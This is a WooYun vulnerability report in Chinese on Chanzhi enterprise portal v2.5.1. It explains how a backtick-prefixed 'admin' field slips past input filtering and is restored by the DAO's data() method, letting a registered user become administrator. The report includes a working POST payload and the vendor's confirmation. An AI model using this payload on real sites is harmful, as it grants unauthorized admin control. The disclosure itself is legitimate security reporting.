{"id": 51875, "wybug_id": "wooyun-2014-073101", "wybug_title": "蝉知企业门户系统 v2.5.1 绕过补丁继续注入", "wybug_corp": "chanzhi.org", "wybug_author": "roker", "wybug_date": "2014-08-20 09:23", "wybug_open_date": "2014-11-18 09:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-18：\t细节向公众公开  简要描述： rt 详细说明：  上次提到过。 WooYun: 蝉知企业门户系统 v2.5 sql 注入至管理员。 /system/module/user/model.php\npublic function update($account)    {        /* If the user want to change his password. */        if($this->post->password1 != false)        {            $this->checkPassword();            if(dao::isError()) return false;            $password  = $this->createPassword($this->post->password1, $account);            $this->post->set('password', $password);        }        $user = fixer::input('post')            ->cleanInt('imobile, qq, zipcode')            ->setDefault('admin', 'no')            ->remove('ip, account, join, visits')            ->removeIF(RUN_MODE != 'admin', 'admin')            ->get();        return $this->dao->update(TABLE_USER)            ->data($user, $skip = 'password1,password2')            ->autoCheck()            ->batchCheck($this->config->user->require->edit, 'notempty')            ->check('email', 'email')            ->check('email', 'unique', \"account!='$account'\")            ->checkIF($this->post->gtalk != false, 'gtalk', 'email')            ->where('account')->eq($account)            ->exec();    }\nfixer这个类对admin字段进行了检测看到 /system/lib/dao/dao.class.php的data()\n*/    public function data($data, $skipFields = '')    {        $this->data = $data;        if($skipFields) $skipFields = ',' . str_replace(' ', '', $skipFields) . ',';        foreach($data as $field => $value)        {            $field = str_replace('`', '', $field);            $field = str_replace(',', '', $field);            if(strpos($skipFields, \",$field,\") !== false) continue;            $this->sql .= \"`$field` = \" . $this->quote($value) . ',';        }        $this->sql = rtrim($this->sql, ',');    // Remove the last ','.        return $this;    }\n去掉了 `这个符号  我们提交 `admin绕过检测后 ，再进入data()后去掉 `又被还原，导致 管理员权限的提升注册用户修改资料 post\nrealname=aaaaaa'&email=z%40qq.com&password1=&password2=&company=&address=&zipcode=&mobile=&phone=&`admin=super\n即可提升至管理员   漏洞证明：  上面说了   修复方案：  过滤。。   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-08-20 15:28 厂商回复： 谢谢反馈。上次的修复还不够彻底。近期再处理下。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}